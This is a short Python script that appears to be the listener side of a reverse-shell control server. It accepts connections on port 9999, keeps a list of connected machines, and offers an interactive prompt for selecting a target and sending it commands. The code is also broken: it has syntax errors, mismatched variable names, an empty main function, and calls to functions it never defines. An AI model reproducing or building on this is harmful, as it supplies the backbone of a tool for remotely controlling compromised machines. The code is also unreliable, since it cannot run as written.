import socket
import sys
import threading
from queue import Queue
import time

NUMBER_OF_THREADS = 2
JOB_NUMBER =[1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# bind socket to port and wait for connection
def socket_bind():
    try:
        global host
        global port
        global s
        print("[+] Binding socket to port: " + str(port))
        s.bind((host,port)))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        time.sleep(2)
        socket_bind()

# accept connections
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, addres = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n[+] Connection established | " + address[0] + ":" + str(address[1]))")
        except:
            print ("Error accepting connections")

# interactive prompt
def start_turtle():
    while True:
        cmd = input('turle> ')
        if cmd == 'list':
            list_connections()
            continue
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

# main
def main():

if __name__ == '__main__':
    main()